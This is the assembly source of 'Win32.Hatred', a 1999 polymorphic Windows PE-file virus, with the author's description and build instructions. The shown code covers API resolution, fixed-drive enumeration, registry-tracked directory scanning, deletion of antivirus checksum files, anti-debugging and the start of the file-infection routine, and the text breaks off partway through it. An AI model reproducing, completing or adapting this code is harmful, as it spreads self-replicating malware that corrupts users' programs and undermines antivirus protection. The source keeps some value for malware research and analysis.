comment $

 ????????????????????????????????????????????????????????????????????????????

                                Win32.Hatred
                                   V.1.0

 ????????????????????????????????????????????????????????????????????????????

                               by Lord Julus

 ????????????????????????????????????????????????????????????????????????????

                                 April 1999

 ????????????????????????????????????????????????????????????????????????????

        Hello everybody and welcome to the source code of my new virus.

        ==============================================================
        Briefing
        ===============================================================
        Virus Name        - Win32.Hatred
        Virus Author      - Lord Julus
        Version           - V.1.0
        Release Date      - 25 April 1999
        Platform          - Win32, Win95/98, WinNT
        Type              - Parasitic PE infector, directory scanning
        Infects           - Win32 Portable Exe files (.EXE, .SCR)
        Encrypted         - Yes
        Polymorphic       - Yes (Uses an enhanced version of MOF32)
        Retrovirus        - Yes
        Anti-debugging    - Yes
        Payload           - Graphical (Message box and screen fade out
                            with pixel blackout; can be stopped by ESC)
        ===============================================================

        This virus works kinda like this way:

        When  the virus starts, first it locates the following win32 module
 bases:

        Kernel32.dll
        Advapi32.dll
        User32.dll
        Gdi32.dll

        and  their  corresponding  API  function addresses. If this goal is
 achieved without any errors, the virus checks the system out and makes out
 an array containing all drive names that are fixed disks, like this:

        "c:\", "d:\", ..., 0FFh

        This list will be used in infection later.

        After that, the virus checks the registry for this key:

        "HKEY_CURRENT_USER\Control Panel\Cursors"

        If it can be opened then the following name is queried:

        "dertaH"

        If  the  value  can be retrieved, it is decrypted with a simple XOR
 algorithm  and  then  it is checked to see if it is really a valid path on
 the hard disk.

        If  the  value cannot be retrieved, or the value retrieved is not a
 valid  path  on  the  HDD,  then the virus initializes the key name with a
 value equal to the first entry in the drives list ("C:\", for ex.).

        After this is done, the scanning procedure is started. The scanning
 procedure  starts  scanning from the root of the matching drive (the drive
 that  was retrieved from the registry) and goes all the way until it finds
 out  the  directory  specified  in the registry (if the virus runs for the
 first  time,  the  first  directory  will  be  the root itself). From that
 directory  on, the virus scans the harddisk for PE files, trying to locate
 5  PE  files.  If  the  5  PE  files  are  not  found on one HDD or on one
 partition,  the  scanning  goes on with the next partition or hdd, as they
 are  found  in  the  drives  list. If the search reaches the end of drives
 list,  but  still  5 PE files were not found, this means that all harddisk
 drives  and all partition tables were checked once and all PE files on the
 entire  system  are  infected. So, the virus resets it's first path to the
 first  root,  and  the  scanning  process  starts  from  the beginning. To
 prevent  a  big system slowdown only 90 directories are checked at a time.
 In  this way, as I tested the scanning procedures many times, basically no
 slowdown  is  notticed.  Still,  all drives and partitions are scanned and
 infected.

        Once  5 files were found, or more than 90 directories were checked,
 the  virus  goes back into the registry and marks there the last directory
 that  was checked. This will be used the next time the virus starts as the
 starting point for the scanning.

        In  the  beginning,  if the key inside the registry is not found, a
 direct  attack  procedure  is  started  which  searches  and  infects  the
 following files:

        CDPLAYER.EXE
        CALC.EXE
        PBRUSH.EXE
        MPLAYER.EXE
        NOTEPAD.EXE
        WINHLP32.EXE

        The  appending  method  is  the  last  section  increase. The virus
 attaches  itself to last section's RVA plus it's virtual size and sets the
 file entrypoint to itself. After finishing all the work, the virus returns
 the control to the host restoring all registers, stack and SEH handlers.

        Each  time  one  directory  is  checked for PE files, all antivirus
 checksum  files  found  in  that directory get erased. The virus avoids to
 infect files with certain names (AV file names)

        The PE files are marked as infected like this:

        Win32VersionValue is set to 'H8'

        This  virus  includes  a slighty modified version of the MOF32 poly
 engine and from my calculation only 4 bytes stay unencrypted in the victim
 file,  which  is  pretty  cool...

        For  the  Anti-debugging  I  have  used some apis that notifies the
 presence  of a debugger and the file is automatically closed. I tried this
 using  the  debugger  in  Visual  C++ and it works. Should crash many code
 emulators which rely on the use of win32 debugging methods.

        This is far the best virus I wrote so far, probably due to the poly
 engine  and the way it is spreading, and it has the highest possibility of
 spreading,  being  very  infectious. I guess probably this will be my last
 win32  directory  scanning virus and my next code will be a resident win32
 virus.

                                        Farewell,

                                   ???????????????????????????
                                   ?    Lord Julus - 1999    ?
                                   ???????????????????????????


                   ======         =======         ======
            =======      With Heart feel Hatred!!!      ======
        ======      Black blood runs through my veins!!     ======
             ======         Hatred!!! Hatred!!!         =====
                   ========                      =======
                                ===========
                                 (ManOwaR)


 Assemble with: TASM32 -ml -m hatred.asm
                TLINK32 -Tpe -aa -c hatred,,,import32.lib
                PEWRSEC hatred.exe

        $

; [ EQUATES ]
;
; The following equates are crucial for the way this code gets compiled.
; You must be warned that changing any of these values might make this
; code act diferently. You modify them at your own will.
;
; To simply test the directory search capability set the value TESTONLY
; to TRUE and look in the registry (no files are searched)
;
; To only have infection on files like GOAT* set the value DEBUG to TRUE
;
; To test the payload of this virus set DEBUG and TESTONLY to TRUE and set
; the date to day 07.

TRUE            EQU     1     ;
FALSE           EQU     0     ;
DEBUG           EQU     TRUE  ; If TRUE only GOAT* files are searched
TESTONLY        EQU     FALSE ; If True only dir. scan and reg. update
RETRO           EQU     TRUE  ; kill av files?


.386p                                              ; needed stuff
.model flat, stdcall                               ;
jumps                                              ;
                                                   ;
extrn MessageBoxA: proc                            ;
extrn ExitProcess: proc                            ; externals
extrn GetModuleHandleA:proc                        ;
extrn GetProcAddress:proc                          ;
                                                   ;
.data                                              ;
db 0                                               ;
                                                   ;
.code                                              ;
                                                   ;
start:                                             ;
       pushad                                      ; save all
                                                   ;
jump_code:                                         ;
       jmp decrypt                                 ; call poly decryptor
                                                   ;
realstart:                                         ;
start_of_code:                                     ;
       nop                                         ;
       nop                                         ;
       popad                                       ;
       pushad                                      ;
       call getdelta                               ; get delta handle
                                                   ;
getdelta:                                          ;
       pop ebp                                     ;
       sub ebp, offset getdelta                    ;
       mov [ebp+delta], ebp                        ; save delta for later
   ;-----------------------------------------------;
       lea eax, [ebp+ExceptionExit]                ; Setup a SEH frame
       push eax                                    ;
       push dword ptr fs:[0]                       ;
       mov fs:[0], esp                             ;
   ;-----------------------------------------------;
       mov eax, [esp+28h]                          ; first let's locate the
       lea edx, [ebp+kernel32_name]                ; kernel32 base address
       call LocateKernel32                         ;
       jc ReturnToHost                             ;
       mov dword ptr [ebp+k32], eax                ; save it...
   ;-----------------------------------------------;
       lea edx, dword ptr [ebp+getprocaddress]     ; then let's locate
       call LocateGetProcAddress                   ; GetProcAddress
       jc ReturnToHost                             ;
   ;-----------------------------------------------;
       mov ebx, eax                                ; now let's locate all
       mov eax, dword ptr [ebp+k32]                ; the K32 apis we need
       lea edi, dword ptr [ebp+k32_API_names]      ; furthure...
       lea esi, dword ptr [ebp+k32_API_addrs]      ;
       call LocateApiAddresses                     ;
       jc ReturnToHost                             ;
   ;-----------------------------------------------;
       lea edi, dword ptr [ebp+user32_name]        ; Locate USER32
       call LocateModuleBase                       ; module base
       jc ReturnToHost                             ;
   ;-----------------------------------------------;
       lea edi, dword ptr [ebp+u32_API_names]      ; and the corresp.
       lea esi, dword ptr [ebp+u32_API_addrs]      ; API addresses
       call LocateApiAddresses                     ;
       jc ReturnToHost                             ;
   ;-----------------------------------------------;
       IF DEBUG                                    ; Anti-debugging !!
       ELSE                                        ;
       call [ebp+_IsDebuggerPresent]               ; Let's check if our
       or eax, eax                                 ; process is being
       jne shut_down                               ; debugged.
       jmp continue_process                        ;
                                                   ;
       shut_down:                                  ;
       push 0                                      ; If so, close down!!
       push 02h or 04h or 08h or 10h               ; this doesn't really
       call [ebp+_ExitWindowsEx]                   ; close Windoze...
       ENDIF                                       ;
    ;----------------------------------------------;
       continue_process:                           ;
       lea edi, dword ptr [ebp+advapi32_name]      ; Locate the ADVAPI32
       call LocateModuleBase                       ; module base
       jc ReturnToHost                             ;
   ;-----------------------------------------------;
       lea edi, dword ptr [ebp+a32_API_names]      ; and the corresp.
       lea esi, dword ptr [ebp+a32_API_addrs]      ; API addresses
       call LocateApiAddresses                     ;
       jc ReturnToHost                             ;
   ;-----------------------------------------------;
       lea edi, dword ptr [ebp+gdi32_name]         ; Locate GDI32
       call LocateModuleBase                       ; module base
       jc ReturnToHost                             ;
   ;-----------------------------------------------;
       lea edi, dword ptr [ebp+g32_API_names]      ; and the corresp.
       lea esi, dword ptr [ebp+g32_API_addrs]      ; API addresses
       call LocateApiAddresses                     ;
       jc ReturnToHost                             ;
   ;-----------------------------------------------;
       call CheckSystem                            ; retrive HDD names
   ;-----------------------------------------------;
       lea eax, [ebp+curdir]                       ; save the current dir
       push eax                                    ;
       push 260                                    ;
       call [ebp+_GetCurrentDirectoryA]            ;
   ;-----------------------------------------------;
       call SetInitialKey                          ; Edi will point to the
   ;-----------------------------------------------; last directory checked.
       lea eax, dword ptr [ebp+system_paths]       ; If the key didn't exist
       scan_current_path:                          ; it gets created. Then
       mov bl, byte ptr [eax]                      ; we make eax to point to
       cmp bl, byte ptr [edi]                      ; the right drive letter
       je ok_go                                    ; in the system paths
       add eax, 4                                  ;
       cmp byte ptr [eax], 0FFh                    ;
       je ReturnToHost                             ;
       jmp scan_current_path                       ;
       ok_go:                                      ;
   ;-----------------------------------------------;
       call LocateNextDirectory                    ; and then we search...
   ;-----------------------------------------------;
       call SetSubsequentKey                       ; set the new key
   ;-----------------------------------------------;
       lea eax, [ebp+curdir]                       ; restore the current dir
       push eax                                    ;
       call [ebp+_SetCurrentDirectoryA]            ;
   ;-----------------------------------------------;
       call Payload                                ;
   ;-----------------------------------------------;
       jmp ReturnToHost                            ; return to host
   ;-----------------------------------------------;

;??????????????????????????????????????????????????????????????????????????
;? Locate Kernel32 base address                                           ?
;??????????????????????????????????????????????????????????????????????????
;
; Entry:  EAX = dword on stack at startup
;         EDX = pointer to kernel32 name
;
; Return: EAX = base address of kernel32 if success
;         EAX = 0, CF set if fail

LocateKernel32 proc near
       pushad                                      ; save all registers
       lea ebx, dword ptr [ebp+try_method_2_error] ; first set up a seh
       push ebx                                    ; frame so that if our
       push dword ptr fs:[0]                       ; first method crashes
       mov fs:[0], esp                             ; we will find ourselves
                                                   ; in the second method
locateloop:                                        ;
       cmp dword ptr [eax+0b4h], eax               ; first method looks for
       je found_k32_kill_seh                       ; the k32 by checking for
       dec eax                                     ; the equal dword at 0b4
       cmp eax, 40000000h                          ;
       jbe try_method_2                            ;
       jmp locateloop                              ;
                                                   ;
found_k32_kill_seh:                                ; if we found it, then we
       pop dword ptr fs:[0]                        ; must destroy the temp
       add esp, 4                                  ; seh frame
       mov dr0, eax                                ; save k32 base in DR0
       jmp found_k32                               ;
                                                   ;
try_method_2_error:                                ; if the first method gave
        mov esp, [esp+8]                           ; and exception error we
                                                   ; must restore the stack
try_method_2:                                      ;
       pop dword ptr fs:[0]                        ; restore the seh state
       add esp, 4                                  ;
       popad                                       ; restore registers and
       pushad                                      ; save them again
                                                   ; and go on w/ method two
       mov ebx, dword ptr [ebp+imagebase]          ; now put imagebase in ebx
       mov esi, ebx                                ;
       cmp word ptr [esi], 'ZM'                    ; check if it is an EXE
       jne notfound_k32                            ;
       mov esi, dword ptr [esi.MZ_lfanew]          ; get pointer to PE
       cmp esi, 1000h                              ; too far away?
       jae notfound_k32                            ;
       add esi, ebx                                ;
       cmp word ptr [esi], 'EP'                    ; is it a PE?
       jne notfound_k32                            ;
       add esi, IMAGE_FILE_HEADER_SIZE             ; skip header
       mov edi, dword ptr [esi.OH_DataDirectory.DE_Import.DD_VirtualAddress]
       add edi, ebx                                ; and get import RVA
       mov ecx, dword ptr [esi.OH_DataDirectory.DE_Import.DD_Size]
       add ecx, edi                                ; and import size
       mov eax, edi                                ; save RVA
                                                   ;
locateloop2:                                       ;
       mov edi, dword ptr [edi.ID_Name]            ; get the name
       add edi, ebx                                ;
       cmp dword ptr [edi], 'NREK'                 ; and compare to KERN
       je found_the_kernel_import                  ; if it is not that one
       add eax, IMAGE_IMPORT_DESCRIPTOR_SIZE       ; skip to the next desc.
       mov edi, eax                                ;
       cmp edi, ecx                                ; but not beyond the size
       jae notfound_k32                            ; of the descriptor
       jmp locateloop2                             ;
                                                   ;
found_the_kernel_import:                           ; if we found the kernel
       mov edi, eax                                ; import descriptor
       mov esi, dword ptr [edi.ID_FirstThunk]      ; take the pointer to
       add esi, ebx                                ; addresses
       mov edi, dword ptr [edi.ID_Characteristics] ; and the pointer to
       add edi, ebx                                ; names
                                                   ;
gha_locate_loop:                                   ;
       push edi                                    ; save pointer to names
       mov edi, dword ptr [edi.TD_AddressOfData]   ; go to the actual thunk
       add edi, ebx                                ;
       add edi, 2                                  ; and skip the hint
                                                   ;
       push edi esi                                ; save these
       lea esi, dword ptr [ebp+getmodulehandle]    ; and point the name of
       mov ecx, getmodulehandlelen                 ; GetModuleHandleA
       rep cmpsb                                   ; see if it is that one
       je found_getmodulehandle                    ; if so...
       pop esi edi                                 ; otherwise restore
                                                   ;
       pop edi                                     ; restore arrays indexes
       add edi, 4                                  ; and skip to next
       add esi, 4                                  ;
       cmp dword ptr [esi], 0                      ; 0? -> end of import
       je notfound_k32                             ;
       jmp gha_locate_loop                         ;
                                                   ;
found_getmodulehandle:                             ;
       pop esi                                     ; restore stack
       pop edi                                     ;
       pop edi                                     ;
                                                   ;
       push edx                                    ; push kernel32 name
       mov esi, [esi]                              ; esi = GetModuleHandleA
       call esi                                    ; address...
       mov dr0, eax                                ; DR0 holds k32 base!!
       or eax, eax                                 ;
       jz notfound_k32                             ;
                                                   ;
found_k32:                                         ;
       popad                                       ; restore all regs and
       mov eax, dr0                                ; put k32 in EAX
       clc                                         ; and mark success
       ret                                         ;
                                                   ;
notfound_k32:                                      ;
       popad                                       ; restore all regs
       xor eax, eax                                ; and mark the failure...
       stc                                         ;
       ret                                         ;
LocateKernel32 endp                                ;

;??????????????????????????????????????????????????????????????????????????
;? Locate GetProcAddress                                                  ?
;??????????????????????????????????????????????????????????????????????????
;
; Entry:  EAX = base of kernel32
;         EDX = pointer to GetProcAddress name
;
; Return: EAX = address of GetProcAddress if success
;         EAX = 0, CF set if fail

LocateGetProcAddress proc near                     ;
       pushad                                      ;
       mov ebx, eax                                ; save the kernel base
       mov edi, eax                                ;
       cmp word ptr [edi], 'ZM'                    ; is it an exe?
       jne notfoundgpa                             ;
                                                   ;
       mov edi, dword ptr [edi.MZ_lfanew]          ;
       cmp edi, 1000h                              ;
       jae notfoundgpa                             ;
                                                   ;
       add edi, ebx                                ;
       cmp word ptr [edi], 'EP'                    ; is it a PE?
       jne notfoundgpa                             ;
                                                   ;
       add edi, IMAGE_FILE_HEADER_SIZE             ; skip file header
                                                   ;
       mov edi, dword ptr [edi.OH_DataDirectory.DE_Export.DD_VirtualAddress]
       add edi, ebx                                ; and get export RVA
                                                   ;
       mov ecx, dword ptr [edi.ED_NumberOfNames]   ; save number of names
                                                   ; to look into
       mov esi, dword ptr [edi.ED_AddressOfNames]  ; get address of names
       add esi, ebx                                ; align to base rva
                                                   ;
       push edi                                    ; save pointer to export
                                                   ;
gpa_locate_loop:                                   ;
       mov edi, [esi]                              ; get one name address
       add edi, ebx                                ; and align it
                                                   ;
       push ecx esi                                ; save counter and addr.
                                                   ;
       mov esi, edx                                ; compare to GetProcAddress
       mov ecx, getprocaddresslen                  ;
       rep cmpsb                                   ;
       je foundgpa                                 ;
                                                   ;
       pop esi ecx                                 ; restore them
                                                   ;
       add esi, 4                                  ; and get next name
       loop gpa_locate_loop                        ;
                                                   ;
notfoundgpa:                                       ; we didn't find it...
       pop edi                                     ;
       popad                                       ;
       xor eax, eax                                ; mark failure
       stc                                         ;
       ret                                         ;
                                                   ;
foundgpa:                                          ;
       pop esi ecx                                 ; ecx = how many did we
       pop edi                                     ; check from total, but
       sub ecx, dword ptr [edi.ED_NumberOfNames]   ; we need the reminder
       neg ecx                                     ; of the search
       mov eax, dword ptr [edi.ED_AddressOfOrdinals]; get address of ordinals
       add eax, ebx                                ;
       shl ecx, 1                                  ; and look using the index
       add eax, ecx                                ;
       xor ecx, ecx                                ;
       mov cx, word ptr [eax]                      ; take the ordinal
       mov eax, dword ptr [edi.ED_AddressOfFunctions]; take address of funcs.
       add eax, ebx                                ;
       shl ecx, 2                                  ; we look in a dword array
       add eax, ecx                                ; go to the function addr
       mov eax, [eax]                              ; take it's address
       add eax, ebx                                ; and align it to k32 base
       mov dr0, eax                                ; save it in dr0
       popad                                       ; restore all regs
       mov eax, dr0                                ; and mark success
       clc                                         ;
       ret                                         ;
LocateGetProcAddress endp                          ;

;??????????????????????????????????????????????????????????????????????????
;? General module handle retriving routine                                ?
;??????????????????????????????????????????????????????????????????????????
;
; Entry:  EDI = pointer to module name
;
; Return: EAX = module base address if success
;         EAX = 0, CF set if fail

LocateModuleBase proc near                         ;
       pushad                                      ; save regs
       push edi                                    ; push name
       call dword ptr [ebp+_GetModuleHandleA]      ; call GetModuleHandleA
       mov dr0, eax                                ;
       popad                                       ;
       mov eax, dr0                                ;
       or eax, eax                                 ;
       jz notfoundmodule                           ;
       clc                                         ; success
       ret                                         ;
                                                   ;
notfoundmodule:                                    ;
       stc                                         ; fail
       ret                                         ;
LocateModuleBase endp                              ;

;??????????????????????????????????????????????????????????????????????????
;? General API address retriving routine                                  ?
;??????????????????????????????????????????????????????????????????????????
;
; Entry:  EAX = base address of the module
;         EBX = address of GetProcAddress
;         EDI = pointer to api names list (each item null terminated,
;                                          list terminated with 0FFh)
;         ESI = pointer to api addresses list
;
; Return: CF clear if success and list at ESI filled with API addresses
;         CF set if fail

LocateApiAddresses proc near                       ;
       pushad                                      ; save all regs
       mov edx, eax                                ; save module base
locate_apis_loop:                                  ;
       cmp byte ptr [edi], 0FFh                    ; is it the end?
       je ready_apis                               ;
                                                   ;
       push edx                                    ; save base
       push edi                                    ; push api name
       push edx                                    ; push module base
       call ebx                                    ; call GetProcAddress
       pop edx                                     ; restore module base
       or eax, eax                                 ; error?
       je error_finding_apis                       ;
                                                   ;
       mov dword ptr [esi], eax                    ; save api address
                                                   ;
       mov ecx, 100h                               ; look for the next
       mov al, 0                                   ; api name
       repnz scasb                                 ;
                                                   ;
       add esi, 4                                  ; increment array
       jmp locate_apis_loop                        ;
                                                   ;
ready_apis:                                        ;
       popad                                       ; all ok!
       clc                                         ;
       ret                                         ;
                                                   ;
error_finding_apis:                                ;
       popad                                       ; error here...
       stc                                         ;
       ret                                         ;
LocateApiAddresses endp                            ;

;??????????????????????????????????????????????????????????????????????????
;? Return to host or exit from generation 0                               ?
;??????????????????????????????????????????????????????????????????????????

ReturnToHost proc near                             ;
       jmp restore_seh                             ;
                                                   ;
ExceptionExit:                                     ; if we had an error we
       mov esp, [esp+8]                            ; must restore the ESP
                                                   ;
restore_seh:                                       ;
       pop dword ptr fs:[0]                        ; and restore the SEH
       add esp, 4                                  ; returning to the host...
                                                   ;
       or ebp, ebp                                 ; is it generation 0?
       je generation0_exit                         ;
                                                   ;
       popad                                       ;
                                                   ;
       push edi                                    ; temporary save edi
       db 0bfh                                     ; put delta in edi
delta  dd 0                                        ;
                                                   ;
       cmp edi, 0                                  ; first generation ?
       je generation0_exit                         ;
       mov eax, [edi+offset oldeip]                ; restore old EIP
       add eax, [edi+offset imagebase]             ; align to memory
       push eax                                    ;
       push ebx                                    ;
       lea ebx, [edi+offset jump]                  ; calculate the length of
       sub eax, ebx                                ; the jump to the host
       sub eax, 4                                  ;
       mov dword ptr [edi+jump], eax               ; and store the jump!
       pop ebx                                     ; restore the last regs...
       pop eax                                     ;
       pop edi                                     ;
                                                   ;
       db 0e9h                                     ; this is JMP Original EIP
jump   dd 0                                        ;
                                                   ;
generation0_exit:                                  ; exit from generation 0
       push 0                                      ;
       call ExitProcess                            ;
ReturnToHost endp                                  ;

;??????????????????????????????????????????????????????????????????????????
;? Check the system routines                                              ?
;??????????????????????????????????????????????????????????????????????????

CheckSystem proc near                     ;
       pushad                             ; save regs
       lea esi, [ebp+temp_path]           ; start from "c:\"
       lea edi, [ebp+system_paths]        ;
                                          ;
retrive_drive_type:                       ;
       push esi                           ;
       call [ebp+_GetDriveTypeA]          ; get drive type
                                          ;
       cmp eax, 3                         ; is it a fixed disk?
       jne check_next_path                ;
                                          ;
       mov ecx, 4                         ; save the name in the list
       push esi                           ;
       repnz movsb                        ;
       pop esi                            ;
                                          ;
check_next_path:                          ;
       inc byte ptr [esi]                 ; and go on until z:\
       cmp byte ptr [esi], 'z'            ;
       je finished_paths_search           ;
       jmp retrive_drive_type             ;
                                          ;
finished_paths_search:                    ;
       mov al, 0FFh                       ; mark the end
       stosb                              ;
       popad                              ;
       ret                                ;
CheckSystem endp                          ;
                                          ;
system_paths db 20 dup (0,0,0,0)          ; drives table
temp_path    db "c:\", 0                  ; first path
allfiles     db "*.*", 0                  ; all files mask
dotdot       db "..", 0                   ; dot dot

comment %
;??????????????????????????????????????????????????????????????????????????
;? Allocate memory area                                                   ?
;??????????????????????????????????????????????????????????????????????????
;
; Entry:  ECX = size of memory to allocate
;
; Return: EAX = new memory area address if succes
;         EAX = 0, CF set if error

AllocateMemory proc near                           ;
       push ecx                                    ; push ammount of memo
       push 040h                                   ; fixed mem initialized
       call [ebp+_GlobalAlloc]                     ; with 0
       or eax, eax                                 ;
       je no_memory                                ;
                                                   ;
       clc                                         ;
       ret                                         ;
                                                   ;
no_memory:                                         ;
       stc                                         ;
       ret                                         ;
AllocateMemory endp                                ;

;??????????????????????????????????????????????????????????????????????????
;? Free memory area                                                       ?
;??????????????????????????????????????????????????????????????????????????
;
; Entry:  EAX = memory area handle
;
; Return: nothing

FreeMemory proc near                               ;
       push eax                                    ; free the memory
       call [ebp+_GlobalFree]                      ; handle
       ret                                         ;
FreeMemory endp                                    ;
        %

;??????????????????????????????????????????????????????????????????????????
;? Locate needed directories                                              ?
;??????????????????????????????????????????????????????????????????????????
;
; Entry:  EDI = pointer to the directory to start from
;         EAX = pointer in the system paths

LocateNextDirectory proc near             ;
       pushad                             ; save regs
                                          ;
       mov [ebp+signal], 0                ;
       mov [ebp+files], 5                 ; how many files ?
       mov [ebp+scanneddirs], 90          ; how many directories ?
                                          ;
       push eax                           ;
       mov edi, eax                       ; start from...
                                          ;
parse_all_system:                         ;
       cmp [ebp+signal], 1                ;
       je no_more_handles                 ;
       push edi                           ; set the current dir to the
       call [ebp+_SetCurrentDirectoryA]   ; root of the dir
       xor ebx, ebx                       ; ebx will hold the entries in
                                          ; the depth
find_first_directory:                     ;
       cmp [ebp+signal], 1                ;
       je no_first_dir_found              ;
       lea edi, [ebp+searchrec]           ; locate the first directory
       push edi                           ;
       lea eax, [ebp+allfiles]            ;
       push eax                           ;
       call [ebp+_FindFirstFileA]         ;
                                          ;
       cmp eax, -1                        ;
       je no_first_dir_found              ; if we didn't find any...
                                          ;
       mov [ebp+handle], eax              ; save the handle
                                          ;
check_attributes:                         ;
       cmp dword ptr [edi.FileAttributes], 10h ; is it really a
       jne find_next_directory            ; directory?
                                          ;
       lea eax, [edi.FileName]            ; get directory name and be sure
       cmp byte ptr [eax], '.'            ; it isn't "." or ".."
       je find_next_directory             ;
                                          ;
       push eax                           ; set it as the new current
       call [ebp+_SetCurrentDirectoryA]   ; directory
                                          ;
       cmp [ebp+skip], 1                  ; do we need to check the path?
       je locate_files                    ;
                                          ;
       pushad                             ; if so, then first get the current
       lea eax, [ebp+offset tempdir]      ; directory and...
       push eax                           ;
       push 260                           ;
       call [ebp+_GetCurrentDirectoryA]   ;
       lea edi, [ebp+offset tempdir]      ;
       lea esi, [ebp+key_data]            ; ...compare it with the one saved
       mov eax, esi                       ; in the registry...
       push eax                           ;
       call [ebp+_lstrlen]                ;
       mov ecx, eax                       ;
       rep cmpsb                          ; if they are equal, we start over
       jne not_found_our_dir              ; from there...
       popad                              ;
       jmp locate_files                   ;
                                          ;
not_found_our_dir:                        ;
       popad                              ;
       jmp still_go                       ;
                                          ;
locate_files:                             ;
       mov [ebp+skip], 1                  ;
                                          ;
       IF TESTONLY                        ;
       ELSE                               ;
       call LocateFilesInDirectory        ; ...
       ENDIF                              ;
                                          ;
       dec [ebp+scanneddirs]              ; do not scan more than 90 dirs.
       jnz still_ok                       ; If HDD is completely infected the
                                          ; process would slow too much...
       mov [ebp+signal], 1                ;
                                          ;
still_ok:                                 ;
       cmp [ebp+files], 0                 ;
       jne still_go                       ;
                                          ;
       mov [ebp+signal], 1                ;
                                          ;
still_go:                                 ;
       push dword ptr [ebp+handle]        ; push the handle
       inc ebx                            ; increment pushed handles number
       jmp find_first_directory           ; and search again
                                          ;
find_next_directory:                      ;
       cmp [ebp+signal], 1                ;
       je no_next_dir_found               ;
       push edi                           ; let's find the next directory
       push dword ptr [ebp+handle]        ;
       call [ebp+_FindNextFileA]          ;
                                          ;
       test eax, eax                      ;
       jz no_next_dir_found               ; if no next dir...
                                          ;
       jmp check_attributes               ; otherwise check...
                                          ;
no_first_dir_found:                       ; if no new dir was found in where
       cmp [ebp+signal], 1                ;
       je don_t_change                    ;
       lea eax, [ebp+dotdot]              ; we are let's go back one dir
       push eax                           ; changing to '..'
       call [ebp+_SetCurrentDirectoryA]   ;
                                          ;
don_t_change:                             ;
       or ebx, ebx                        ; do we have any saved find
       jz no_more_handles                 ; handles?
                                          ;
       dec ebx                            ; if we do decrement and pop one
       pop dword ptr [ebp+handle]         ; of the stack...
       jmp find_next_directory            ; and let's find one more...
                                          ;
no_next_dir_found:                        ; if no next dir was found, let's
       cmp [ebp+signal], 1                ;
       je no_first_dir_found              ;
       push dword ptr [ebp+handle]        ; close the find handle
       call [ebp+_FindClose]              ;
       jmp no_first_dir_found             ;
                                          ;
no_more_handles:                          ; when all handles are closed in
       pop eax                            ; the current drive let's try
       add eax, 4                         ; the next one...
       push eax                           ;
       mov edi, eax                       ;
       cmp byte ptr [eax], 0FFh           ; 0ffh marks the end...
       jne parse_all_system               ;
                                          ;
       cmp [ebp+scanneddirs], 0           ;
       je quit_this                       ;
                                          ;
       cmp [ebp+files], 0                 ; if we didn't find all the files
       je quit_this                       ; during our search
       lea eax, [ebp+system_paths]        ; then we must reset ourselves
       push eax                           ;
       call [ebp+_SetCurrentDirectoryA]   ;
                                          ;
quit_this:                                ;
       pop eax                            ; restore all and go away...
       popad                              ;
       ret                                ;
LocateNextDirectory endp                  ;
                                          ;
LocateFilesInDirectory proc near          ;
       pushad                             ;
                                          ;
       lea ebx, [ebp+filemasks]           ; point the filemasks
       push ebx                           ;
                                          ;
try_next_ext:                             ;
       cmp [ebp+files], 0                 ;
       je no_files                        ;
       lea eax, [ebp+offset searchfiles]  ;
       push eax                           ;
       push ebx                           ;
       call [ebp+_FindFirstFileA]         ; search first matching file
                                          ;
       cmp eax, -1                        ;
       je no_files                        ;
                                          ;
       mov [ebp+searchhandle], eax        ; save it's handle
                                          ;
test_file:                                ;
       lea edi, [ebp+searchfiles]         ;
       cmp dword ptr [edi.FileAttributes], 10h ; skip directories
       je next_file                       ;
                                          ;
       lea esi, [edi.FileName]            ; point the name
                                          ;
       call ValidateFile                  ; can we infect it?
       jc next_file                       ;
                                          ;
       call OpenFile                      ; open the file!!
                                          ;
next_file:                                ;
       cmp [ebp+files], 0                 ;
       je no_files                        ;
       lea eax, [ebp+searchfiles]         ;
       push eax                           ; search the next file
       mov eax, [ebp+searchhandle]        ;
       push eax                           ;
       call [ebp+_FindNextFileA]          ;
                                          ;
       test eax, eax                      ;
       jz no_files                        ;
       jmp test_file                      ;
                                          ;
no_files:                                 ;
       mov eax, [ebp+searchhandle]        ;
       push eax                           ;
       call [ebp+_FindClose]              ; close the search handle
                                          ;
       IF RETRO                           ;
       call EraseChecksums                ; kill av files?
       ENDIF                              ;
                                          ;
       pop ebx                            ; locate the next extension
       mov edi, ebx                       ; in the list
       mov ecx, 100                       ;
       mov al, 0                          ;
       repnz scasb                        ;
       mov ebx, edi                       ;
       cmp byte ptr [ebx], 0FFh           ;
       je no_more                         ;
       push ebx                           ;
       jmp try_next_ext                   ; and try again...
                                          ;
 no_more:                                 ;
       popad                              ;
       ret                                ;
LocateFilesInDirectory endp               ;

;??????????????????????????????????????????????????????????????????????????
;? Open the file                                                          ?
;??????????????????????????????????????????????????????????????????????????
;
; Entry:  ESI = pointer to the file name
;

OpenFile proc near
       pushad                             ; save registers
       mov [ebp+fileofs], esi             ; save file name offset
       push esi                           ; save it
       call [ebp+_GetFileAttributes]      ; Get the file attributes
       or eax, eax                        ;
       jz error1                          ;
       mov [ebp+fileattributes], eax      ; save them
                                          ;
error1:                                   ;
       push 80h                           ;
       push esi                           ;
       call [ebp+_SetFileAttributes]      ; set them as normal
                                          ;
       push 0                             ; and open the file
       push 0                             ;
       push 3                             ;
       push 0                             ;
       push 1                             ;
       push 80000000h or 40000000h        ;
       push esi                           ;
       call [ebp+_CreateFileA]            ;
                                          ;
       cmp eax, -1                        ; error?
       je next_file_exit                  ;
                                          ;
       mov [ebp+handle1], eax             ; save it's handle
                                          ;
       lea ebx, [ebp+offset FileTime]     ; now save the file time
       push ebx                           ;
       add ebx, 8                         ;
       push ebx                           ;
       add ebx, 8                         ;
       push ebx                           ;
       push eax                           ;
       call [ebp+_GetFileTime]            ;
                                          ;
       push 0                             ; get file size
       mov eax, [ebp+handle1]             ;
       push eax                           ;
       call [ebp+_GetFileSize]            ;
                                          ;
       mov [ebp+filesize], eax            ; save the filesize and calculate
       add eax, virussize+500h            ; ammount of memory needed
                                          ;
       push 0                             ; and create a file mapping
       push eax                           ;
       push 0                             ;
       push 4                             ;
       push 0                             ;
       mov eax, [ebp+handle1]             ;
       push eax                           ;
       call [ebp+_CreateFileMappingA]     ;
                                          ;
       cmp eax, 0                         ;
       je close_file                      ;
                                          ;
       mov [ebp+maphandle], eax           ; save map handle
                                          ;
       mov eax, [ebp+filesize]            ;
       add eax, virussize+500h            ;
       push eax                           ; map the file!!
       push 0                             ;
       push 0                             ;
       push 2                             ;
       mov eax, [ebp+maphandle]           ;
       push eax;                          ;
       call [ebp+_MapViewOfFile]          ;
                                          ;
       cmp eax, 0                         ;
       je close_map                       ;
                                          ;
       mov esi, eax                       ;
       mov [ebp+mapaddress], esi          ; save map address
                                          ;
